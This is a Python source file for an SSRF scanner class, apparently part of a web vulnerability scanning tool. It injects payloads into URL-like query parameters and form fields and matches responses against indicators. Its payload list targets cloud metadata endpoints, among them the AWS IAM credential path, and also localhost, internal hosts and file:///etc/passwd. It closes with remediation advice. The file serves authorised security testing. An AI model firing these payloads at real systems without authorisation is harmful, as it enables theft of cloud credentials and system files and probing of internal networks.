"""
Server-Side Request Forgery (SSRF) Scanner
OWASP: A10 - Server-Side Request Forgery | CWE-918

Detects SSRF vulnerabilities by injecting internal/cloud URLs into
URL-like parameters. Tests cloud metadata (AWS, GCP, Azure), localhost
variations, internal networks, and protocol handlers.
"""

import logging
from urllib.parse import urlparse, urlencode, parse_qs
from app.scanner.vulnerabilities.base import BaseScanner
from app.scanner.payload_manager import get_payload_manager

logger = logging.getLogger(__name__)


class SSRFScanner(BaseScanner):
    """Detects Server-Side Request Forgery (SSRF) vulnerabilities.

    Detection Techniques:
    1. AWS EC2 metadata / IAM credentials
    2. GCP metadata service
    3. Azure IMDS
    4. Localhost variations
    5. Internal network probing (RFC 1918)
    6. Protocol handler abuse (file://, dict://, gopher://)
    7. Port scanning via SSRF
    """

    # Parameter names likely to accept URLs
    URL_PARAM_KEYWORDS = [
        'url', 'uri', 'link', 'href', 'target', 'redirect', 'callback',
        'fetch', 'proxy', 'image', 'img', 'src', 'source', 'dest',
        'destination', 'domain', 'host', 'site', 'page', 'feed',
        'load', 'open', 'path', 'endpoint', 'api', 'webhook',
        'return', 'next', 'continue', 'redir', 'file', 'download',
    ]

    # ── Payload definitions ──────────────────────────────────────────

    def __init__(self, session=None, timeout=8, delay=0.5):
        super().__init__(session, timeout, delay)
        self._pm_ssrf_payloads = []
        try:
            self.payload_manager = get_payload_manager()
            pm_payloads = self.payload_manager.get_payloads('ssrf', source='both')
            self._pm_ssrf_payloads = pm_payloads
            stats = self.payload_manager.get_stats()
            count = stats['total'].get('ssrf', 0)
            logger.info(f'SSRF: {count} payloads available ({len(pm_payloads)} from PayloadManager)')
        except Exception as e:
            self.payload_manager = None
            logger.debug(f'PayloadManager not available: {e}')

    def _get_ssrf_payloads(self):
        """Return structured SSRF payload sets for testing."""
        payloads = [
            # AWS Metadata
            {
                'name': 'aws-metadata',
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'headers': {},
                'indicators': ['ami-id', 'instance-id', 'instance-type',
                               'local-ipv4', 'public-hostname', 'security-groups'],
                'severity': 'critical',
                'cvss': 9.8,
                'description': 'AWS EC2 instance metadata accessible via SSRF.',
            },
            {
                'name': 'aws-iam-credentials',
                'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'headers': {},
                'indicators': ['AccessKeyId', 'SecretAccessKey', 'Token',
                               'Expiration', 'Code'],
                'severity': 'critical',
                'cvss': 10.0,
                'description': 'AWS IAM role credentials exposed via SSRF.',
            },
            # GCP Metadata
            {
                'name': 'gcp-metadata',
                'payload': 'http://metadata.google.internal/computeMetadata/v1/',
                'headers': {'Metadata-Flavor': 'Google'},
                'indicators': ['project', 'instance', 'serviceAccounts',
                               'zone', 'machine-type'],
                'severity': 'critical',
                'cvss': 9.8,
                'description': 'GCP metadata service accessible via SSRF.',
            },
            # Azure Metadata
            {
                'name': 'azure-imds',
                'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'headers': {'Metadata': 'true'},
                'indicators': ['compute', 'network', 'vmId', 'subscriptionId',
                               'resourceGroupName', 'azEnvironment'],
                'severity': 'critical',
                'cvss': 9.8,
                'description': 'Azure Instance Metadata Service accessible via SSRF.',
            },
            # Localhost variations
            {
                'name': 'localhost-access',
                'payload': 'http://127.0.0.1/',
                'headers': {},
                'indicators': ['apache', 'nginx', 'it works', 'localhost',
                               'welcome', 'default page', 'index of'],
                'severity': 'high',
                'cvss': 7.5,
                'description': 'Localhost access via SSRF allows internal service probing.',
            },
            {
                'name': 'localhost-ipv6',
                'payload': 'http://[::1]/',
                'headers': {},
                'indicators': ['apache', 'nginx', 'it works', 'localhost',
                               'welcome', 'default page'],
                'severity': 'high',
                'cvss': 7.5,
                'description': 'IPv6 localhost access via SSRF.',
            },
            # Internal network
            {
                'name': 'internal-network-192',
                'payload': 'http://192.168.1.1/',
                'headers': {},
                'indicators': ['router', 'admin', 'login', 'gateway',
                               'password', 'configuration', 'settings'],
                'severity': 'high',
                'cvss': 7.5,
                'description': 'Internal network (192.168.x.x) accessible via SSRF.',
            },
            # Protocol handlers - file
            {
                'name': 'protocol-file',
                'payload': 'file:///etc/passwd',
                'headers': {},
                'indicators': ['root:', 'daemon:', 'bin:', '/bin/bash',
                               '/bin/sh', 'nobody:'],
                'severity': 'critical',
                'cvss': 9.1,
                'description': 'Local file read via file:// protocol handler in SSRF.',
            },
        ]

        # Append PayloadManager SSRF payloads as additional structured entries
        existing_payloads = {ps['payload'] for ps in payloads}
        for raw_payload in self._pm_ssrf_payloads:
            if raw_payload not in existing_payloads:
                payloads.append({
                    'name': 'portswigger-ssrf',
                    'payload': raw_payload,
                    'headers': {},
                    'indicators': ['ami-id', 'instance-id', 'instance-type',
                                   'root:', 'daemon:', 'apache', 'nginx',
                                   'localhost', 'it works', 'welcome',
                                   'project', 'serviceAccounts', 'vmId',
                                   'router', 'admin', 'login'],
                    'severity': 'high',
                    'cvss': 7.5,
                    'description': 'SSRF payload from PortSwigger Academy.',
                })

        return payloads

    # ── Parameter detection ──────────────────────────────────────────

    def _is_url_parameter(self, point):
        """Detect if a parameter is likely to accept URL values.

        Checks parameter names against URL-related keywords.
        """
        if isinstance(point, dict):
            param_name = point.get('name', '').lower()
            return any(keyword in param_name for keyword in self.URL_PARAM_KEYWORDS)
        return False

    def _is_url_form_field(self, inp):
        """Check if a form input field accepts URL values."""
        name = inp.get('name', '').lower()
        input_type = inp.get('type', '').lower()
        return (
            any(keyword in name for keyword in self.URL_PARAM_KEYWORDS)
            or input_type == 'url'
        )

    # ── Core testing ─────────────────────────────────────────────────

    def _test_ssrf_on_param(self, url, param_name, payload_set):
        """Test SSRF by injecting payload into a URL query parameter.

        Returns a vulnerability finding dict or None.
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            # Inject payload into the target parameter
            test_params = dict(params)
            test_params[param_name] = [payload_set['payload']]
            query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            # Merge any required headers
            headers = dict(payload_set.get('headers', {}))

            response = self._request('GET', test_url, headers=headers)
            if not response:
                return None

            return self._check_response(
                response, url, param_name, payload_set, test_url, 'GET'
            )

        except Exception as e:
            logger.debug(f'SSRF param test error: {e}')
            return None

    def _test_ssrf_on_form(self, form, payload_set):
        """Test SSRF by injecting payload into form fields.

        Returns a vulnerability finding dict or None.
        """
        try:
            url = form.get('action', '')
            method = form.get('method', 'get').upper()
            inputs = form.get('inputs', [])

            for target_input in inputs:
                if not self._is_url_form_field(target_input):
                    continue

                data = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data[inp['name']] = payload_set['payload']
                    elif inp['type'] in ('submit', 'button'):
                        data[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data[inp['name']] = inp.get('value', '') or 'test'

                headers = dict(payload_set.get('headers', {}))

                if method == 'POST':
                    response = self._request('POST', url, data=data, headers=headers)
                else:
                    response = self._request('GET', url, params=data, headers=headers)

                if not response:
                    continue

                result = self._check_response(
                    response, url, target_input['name'],
                    payload_set, url, method
                )
                if result:
                    return result

        except Exception as e:
            logger.debug(f'SSRF form test error: {e}')
        return None

    def _check_response(self, response, url, param_name, payload_set,
                         test_url, method):
        """Check if SSRF indicators are present in the response."""
        body = response.text.lower()
        detected = [ind for ind in payload_set['indicators']
                    if ind.lower() in body]

        if not detected:
            return None

        # Build evidence snippet
        snippet = ''
        idx = body.find(detected[0].lower())
        if idx >= 0:
            start = max(0, idx - 50)
            end = min(len(response.text), idx + 250)
            snippet = response.text[start:end].strip()

        # Record ML data
        self._record_attempt(
            url=url,
            param=param_name,
            payload=payload_set['payload'],
            baseline_response=None,
            test_response=response,
            vuln_found=True,
            technique=f'ssrf-{payload_set["name"]}',
            vuln_type='ssrf',
            confidence=85,
            severity=payload_set['severity'],
            method=method,
            context='query_parameter',
        )

        finding = {
            'vuln_type': 'ssrf',
            'name': f'Server-Side Request Forgery (SSRF) - {payload_set["name"]}',
            'description': (
                f'{payload_set["description"]} '
                'The application makes server-side HTTP requests using '
                'user-supplied URLs without proper validation.'
            ),
            'impact': (
                'SSRF can lead to:\n'
                '• Access to cloud metadata and credentials (AWS/GCP/Azure)\n'
                '• Internal service discovery and data exfiltration\n'
                '• Reading local files via file:// protocol\n'
                '• Port scanning of internal networks\n'
                '• Bypassing firewalls and access controls'
            ),
            'severity': payload_set['severity'],
            'cvss_score': payload_set['cvss'],
            'confidence': 85,
            'owasp_category': 'A10',
            'cwe': 'CWE-918',
            'affected_url': test_url,
            'parameter': param_name,
            'payload': payload_set['payload'],
            'request_data': (
                f'{method} {test_url}\n'
                + ''.join(f'{k}: {v}\n' for k, v in payload_set.get('headers', {}).items())
            ),
            'response_data': (
                f'Status: {response.status_code}\n'
                f'Indicators found: {", ".join(detected)}\n'
                f'Snippet: {snippet[:200]}'
            ),
            'remediation': (
                '1. Use an allowlist of permitted domains/IPs for outbound requests\n'
                '2. Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)\n'
                '3. Block requests to cloud metadata endpoints (169.254.169.254)\n'
                '4. Disable unnecessary URL schemes (file://, dict://, gopher://)\n'
                '5. Use a dedicated HTTP client with SSRF protections\n'
                '6. Implement network-level egress filtering\n'
                '7. Run the application in an isolated network segment'
            ),
        }
        if 'difficulty' in payload_set:
            finding['difficulty'] = payload_set['difficulty']
        return finding

    # ── Main scan ────────────────────────────────────────────────────

    def scan(self, target_url, injectable_points):
        """Scan for SSRF vulnerabilities across all injectable points.

        Only tests parameters whose names suggest they accept URLs.
        """
        self.findings = []
        seen = set()

        for point in injectable_points:
            # Test forms
            if isinstance(point, dict) and point.get('type') == 'form':
                form_key = point.get('action', target_url)
                if form_key in seen:
                    continue
                seen.add(form_key)

                for payload_set in self._get_ssrf_payloads():
                    result = self._test_ssrf_on_form(point, payload_set)
                    if result:
                        self.findings.append(result)
                        break

            # Test URL parameters
            elif isinstance(point, dict) and 'name' in point:
                if not self._is_url_parameter(point):
                    continue

                url = point.get('url', target_url)
                key = f"{url}:{point['name']}"
                if key in seen:
                    continue
                seen.add(key)

                for payload_set in self._get_ssrf_payloads():
                    result = self._test_ssrf_on_param(
                        url, point['name'], payload_set
                    )
                    if result:
                        self.findings.append(result)
                        break

        return self.findings
